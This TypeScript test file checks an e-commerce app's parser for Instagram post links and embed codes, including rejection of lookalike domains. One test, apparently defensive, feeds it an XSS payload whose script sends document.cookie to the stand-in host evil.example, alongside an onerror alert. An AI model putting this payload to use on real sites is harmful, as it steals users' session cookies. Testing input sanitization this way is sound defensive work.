import { describe, it, expect } from 'vitest'
import {
  parseInstagramPostUrl,
  parseInstagramInput,
  createInstagramPostSchema,
  updateInstagramPostSchema,
} from '@ecommerce/shared/contracts'

/**
 * O shortcode é a chave de unicidade do post: se dois formatos do MESMO link
 * normalizassem para códigos diferentes, o post entraria duplicado na vitrine.
 */

const permalink = (code: string) => `https://www.instagram.com/p/${code}/`

describe('parseInstagramPostUrl', () => {
  it.each([
    ['https://www.instagram.com/p/C8xYz12AbCd/', 'C8xYz12AbCd'],
    ['https://instagram.com/p/C8xYz12AbCd', 'C8xYz12AbCd'],
    ['instagram.com/p/C8xYz12AbCd/', 'C8xYz12AbCd'],
    ['https://www.instagram.com/p/C8xYz12AbCd/?igsh=MTc4MmM1YmI2Ng==', 'C8xYz12AbCd'],
    ['https://www.instagram.com/reel/DA_b-9xyz01/?utm_source=ig_web_copy_link', 'DA_b-9xyz01'],
    ['https://www.instagram.com/reels/DA_b-9xyz01/', 'DA_b-9xyz01'],
    ['https://www.instagram.com/tv/B1234567890/', 'B1234567890'],
    ['https://www.instagram.com/arte_no_jardim/p/C8xYz12AbCd/', 'C8xYz12AbCd'],
    ['https://m.instagram.com/p/C8xYz12AbCd/#comments', 'C8xYz12AbCd'],
    ['  https://www.instagram.com/p/C8xYz12AbCd/  ', 'C8xYz12AbCd'],
  ])('%s → %s', (url, code) => {
    expect(parseInstagramPostUrl(url)).toEqual({ shortcode: code, permalink: permalink(code) })
  })

  it.each([
    'https://www.instagram.com/arte_no_jardim/',
    'https://www.instagram.com/arte_no_jardim/reels/',
    'https://www.instagram.com/stories/arte_no_jardim/123/',
    'https://www.instagram.com/p/',
    'https://www.instagram.com.evil.com/p/C8xYz12AbCd/',
    'https://evilinstagram.com/p/C8xYz12AbCd/',
    'https://www.facebook.com/p/C8xYz12AbCd/',
    'não é link',
    '',
  ])('rejeita %s', (url) => {
    expect(parseInstagramPostUrl(url)).toBeNull()
  })
})

// Recortado de um "Incorporar" real (o miolo de estilo/SVG foi encurtado).
const embedCode = (opts: { captioned?: boolean; path?: string } = {}) =>
  `<blockquote class="instagram-media"${opts.captioned ? ' data-instgrm-captioned' : ''} ` +
  `data-instgrm-permalink="https://www.instagram.com/${opts.path ?? 'p/C8xYz12AbCd'}/?utm_source=ig_embed&amp;utm_campaign=loading" ` +
  `data-instgrm-version="14" style="background:#FFF; border:0; max-width:540px;">` +
  `<div style="padding:16px;"><a href="https://www.instagram.com/${opts.path ?? 'p/C8xYz12AbCd'}/?utm_source=ig_embed&amp;utm_campaign=loading" ` +
  `style="background:#FFFFFF;" target="_blank">Ver essa foto no Instagram</a></div></blockquote> ` +
  `<script async src="//www.instagram.com/embed.js"></script>`

describe('parseInstagramInput', () => {
  it('link vira kind=link, sem legenda', () => {
    expect(parseInstagramInput('https://www.instagram.com/p/C8xYz12AbCd/')).toEqual({
      shortcode: 'C8xYz12AbCd',
      permalink: permalink('C8xYz12AbCd'),
      kind: 'link',
      captioned: false,
    })
  })

  it('código do Incorporar vira kind=embed', () => {
    expect(parseInstagramInput(embedCode())).toEqual({
      shortcode: 'C8xYz12AbCd',
      permalink: permalink('C8xYz12AbCd'),
      kind: 'embed',
      captioned: false,
    })
  })

  it('lê a flag de legenda do código', () => {
    expect(parseInstagramInput(embedCode({ captioned: true }))?.captioned).toBe(true)
  })

  it('reel incorporado normaliza para /p/', () => {
    expect(parseInstagramInput(embedCode({ path: 'reel/DA_b-9xyz01' }))?.permalink).toBe(permalink('DA_b-9xyz01'))
  })

  it('sem data-instgrm-permalink, cai no primeiro href do Instagram', () => {
    const code = embedCode().replace(/data-instgrm-permalink="[^"]+"/, '')
    expect(parseInstagramInput(code)?.shortcode).toBe('C8xYz12AbCd')
  })

  it('blockquote sem post nenhum → null', () => {
    expect(parseInstagramInput('<blockquote class="instagram-media">oi</blockquote>')).toBeNull()
  })

  it('HTML hostil: só o shortcode sai, nada do resto é devolvido', () => {
    const hostile = embedCode() + '<script>fetch("https://evil.example/?c="+document.cookie)</script><img src=x onerror=alert(1)>'
    const parsed = parseInstagramInput(hostile)
    expect(parsed).toEqual({
      shortcode: 'C8xYz12AbCd',
      permalink: permalink('C8xYz12AbCd'),
      kind: 'embed',
      captioned: false,
    })
  })

  it('permalink de outro domínio dentro do blockquote → null', () => {
    const code = '<blockquote class="instagram-media" data-instgrm-permalink="https://evil.example/p/C8xYz12AbCd/"></blockquote>'
    expect(parseInstagramInput(code)).toBeNull()
  })
})

describe('createInstagramPostSchema', () => {
  it('aceita link de post', () => {
    expect(
      createInstagramPostSchema.safeParse({ source: 'https://instagram.com/p/C8xYz12AbCd', displayMode: 'IMAGE' }).success,
    ).toBe(true)
  })

  it('aceita o código do Incorporar', () => {
    expect(createInstagramPostSchema.safeParse({ source: embedCode(), displayMode: 'EMBED' }).success).toBe(true)
  })

  it('recusa link de perfil', () => {
    expect(
      createInstagramPostSchema.safeParse({ source: 'https://instagram.com/arte_no_jardim', displayMode: 'IMAGE' }).success,
    ).toBe(false)
  })

  it('exige o modo de exibição', () => {
    expect(createInstagramPostSchema.safeParse({ source: 'https://instagram.com/p/C8xYz12AbCd' }).success).toBe(false)
  })
})

describe('updateInstagramPostSchema', () => {
  it('recusa corpo vazio', () => {
    expect(updateInstagramPostSchema.safeParse({}).success).toBe(false)
  })

  it('aceita só pausar', () => {
    expect(updateInstagramPostSchema.safeParse({ isActive: false }).success).toBe(true)
  })
})
